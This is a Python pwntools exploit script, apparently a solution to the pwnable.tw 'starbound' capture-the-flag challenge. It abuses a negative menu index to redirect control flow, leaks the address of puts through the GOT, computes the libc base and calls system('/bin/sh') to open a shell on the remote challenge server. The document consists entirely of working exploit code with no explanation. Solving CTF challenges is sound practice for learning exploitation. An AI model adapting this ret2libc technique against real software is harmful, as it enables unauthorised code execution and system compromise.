```py
from pwn import *
import time
exe = ELF("./starbound")
libc = ELF("./libc-2.23.so")
context.binary = exe
context.log_level = 'debug'
context.terminal = ['wt.exe', 'wsl.exe', '-d', 'kali-linux']
context.arch = "i386"

def conn():
    if args.REMOTE:
        return remote("chall.pwnable.tw", 10202)
    r = process([exe.path])
    if args.GDB:
        gdb.attach(r)
        time.sleep(2)
    return r

p = conn()

name_addr = 0x80580d0

def opt(i):
    p.sendlineafter(b"> ", str(i).encode())

opt(6)
opt(2)
p.sendlineafter(b"name: ", p32(0x8048e48))
p.sendlineafter(b"> ", b"-33ABCDE"+flat(
    exe.plt["puts"],
    exe.sym.main ,
    exe.got["puts"],
))

puts = u32(p.recv(4))
libc.address = puts-libc.sym["puts"]

opt(6)
opt(2)
p.sendlineafter(b"name: ", p32(0x8048e48)+b"/bin/sh")
p.sendlineafter(b"> ", b"-33ABCDE"+flat(
    libc.sym.system,
    0 ,
    name_addr+4,
))

p.interactive()
```